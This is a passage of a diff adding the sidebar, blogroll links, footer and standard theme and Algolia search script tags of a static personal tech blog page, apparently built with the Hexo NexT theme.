+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xinlc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xinlc" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/xinlc" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;xinlc" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://learnxinyminutes.com/" title="https:&#x2F;&#x2F;learnxinyminutes.com" rel="noopener" target="_blank">Learn X in Y minutes</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://justjavac.com/" title="http:&#x2F;&#x2F;justjavac.com" rel="noopener" target="_blank">justjavac</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ruanyifeng.com/blog/" title="http:&#x2F;&#x2F;www.ruanyifeng.com&#x2F;blog&#x2F;" rel="noopener" target="_blank">阮一峰</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.liaoxuefeng.com/" title="https:&#x2F;&#x2F;www.liaoxuefeng.com" rel="noopener" target="_blank">廖雪峰</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://tech.meituan.com/" title="https:&#x2F;&#x2F;tech.meituan.com" rel="noopener" target="_blank">美团技术</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.v2ex.com/" title="https:&#x2F;&#x2F;www.v2ex.com" rel="noopener" target="_blank">V2EX</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://caniuse.com/" title="https:&#x2F;&#x2F;caniuse.com" rel="noopener" target="_blank">caniuse/工具</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.css88.com/nav/" title="http:&#x2F;&#x2F;www.css88.com&#x2F;nav&#x2F;" rel="noopener" target="_blank">css88/doc</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://overapi.com/" title="http:&#x2F;&#x2F;overapi.com&#x2F;" rel="noopener" target="_blank">OverAPI/api</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://devdocs.io/" title="http:&#x2F;&#x2F;devdocs.io&#x2F;" rel="noopener" target="_blank">DevDocs/api</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://tool.oschina.net/" title="http:&#x2F;&#x2F;tool.oschina.net&#x2F;" rel="noopener" target="_blank">在线工具/索引</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://tool.lu/" title="http:&#x2F;&#x2F;tool.lu&#x2F;" rel="noopener" target="_blank">ToolBox</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://hao.shejidaren.com/" title="http:&#x2F;&#x2F;hao.shejidaren.com&#x2F;" rel="noopener" target="_blank">设计导航</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Richard</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
